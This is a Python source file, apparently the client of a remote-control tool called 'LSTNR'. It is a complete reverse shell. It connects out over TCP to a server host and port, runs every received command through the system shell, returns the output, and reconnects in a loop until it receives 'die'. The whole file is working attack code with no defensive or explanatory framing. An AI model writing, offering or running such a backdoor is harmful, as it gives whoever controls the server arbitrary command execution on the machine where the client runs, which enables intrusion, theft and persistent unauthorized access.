import socket
import subprocess
import sys
import time
import argparse

# Default reconnect delay
RECONNECT_DELAY = 5

# Function to display usage information
def usage():
    print("Usage: python3 client.py -s <server_ip> -p <server_port>")
    sys.exit(1)

# Parse arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description='LSTNR Client')
    parser.add_argument('-s', '--server', type=str, required=True, help='Server IP address to connect to')
    parser.add_argument('-p', '--port', type=int, required=True, help='Server port to connect to')
    return parser.parse_args()

# Function to execute a command and return output
def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        return output
    except Exception as e:
        return f"Error executing command: {e}"

# Main loop
def main():
    args = parse_arguments()
    server = args.server
    port = args.port

    while True:
        # Create a TCP connection to the server
        try:
            sock = socket.create_connection((server, port))
            print(f"[+] Connected to {server}:{port}")
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            time.sleep(RECONNECT_DELAY)
            continue

        # Keep the connection open and listen for commands
        while True:
            try:
                command = sock.recv(1024).decode('utf-8').strip()
                if not command:
                    continue

                print(f"[*] Received command: {command}")

                # If the 'die' command is received, exit
                if command == "die":
                    print("[!] Received kill-session command. Shutting down...")
                    sock.send(b"EOF\n")
                    break

                # Execute the command and capture the output
                output = execute_command(command)

                # Send the output back to the server, appending EOF marker
                sock.send(f"{output}\nEOF\n".encode())
            except Exception as e:
                print(f"[-] Error receiving or sending data: {e}")
                break

        # Close the connection if the loop exits
        print("[*] Connection closed")
        sock.close()

        # Reconnect after the delay
        print(f"[*] Reconnecting in {RECONNECT_DELAY} seconds...")
        time.sleep(RECONNECT_DELAY)

if __name__ == '__main__':
    main()
